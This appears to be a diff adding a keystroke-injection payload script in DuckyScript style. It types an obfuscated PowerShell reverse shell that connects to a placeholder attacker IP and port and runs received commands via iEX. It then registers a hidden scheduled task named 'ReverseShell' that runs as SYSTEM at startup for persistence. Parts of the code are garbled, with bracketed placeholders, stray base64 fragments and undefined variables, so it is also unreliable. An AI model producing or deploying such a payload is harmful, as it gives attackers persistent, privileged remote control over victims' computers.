@@ -1,0 +1,12 @@
+STRING \$ip = "attacker_ip_placeholder"
+STRING \$port = "attacker_port_placeholder"
+STRING \$path = "script_path_placeholder"
+
+REM Base64 encoded PowerShell script
+STRING [TYPENAME]System.Net.Sockets.TCPClient;\$b=\$a.'NeW'('attacker_ip_placeholder',attacker_port_placeholder);\$c=\$b.'GetStream'();[d]# Ym9keVtdXSRieXRlcwAgPT0gMC4uNjU1MzV8fTA=
+STRING \$d = (.\($([char]36)).'GeTsTrEaM'());\$e = 0..65535|%{0};[whVtIGlzCjEwIHwgJHMgLT4gMCkgeyRAKz0kKSAtbmUgMCAkYnl0ZXMuTEFTRmwnU3Vic2NyaWJlLi5H;\\
+STRING \$f = \$d.'ReAd'(\$e,0,\$e.'LENGTh');\$g = (Nw-ObJeCT -TypENAME SysTem.TExT.ASCIIEncOdiNg).'GetString'(\$e,0,\$f);\$h = (iEX \$g 2>&1 | OuT-STrING );\$i = \$h + 'PS ' + (pwD).PatH + '> ';\$j = ([text.encODing]::ASCIi).'GetbYTeS'(\$i);\$k = ([text.encODing]::ASCII).'GetBytes'(\$i);\\
+STRING \$l = [TYPENAME]System.Net.Sockets.TCPClient;\$m=\$l.'Close'();
+STRING \$n = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -File "' + \$path + '"'
+STRING \$o = New-ScheduledTaskTrigger -AtStartup
+STRING Register-ScheduledTask -TaskName 'ReverseShell' -Action \$n -Trigger \$o -User 'SYSTEM' -RunLevel Highest -Force
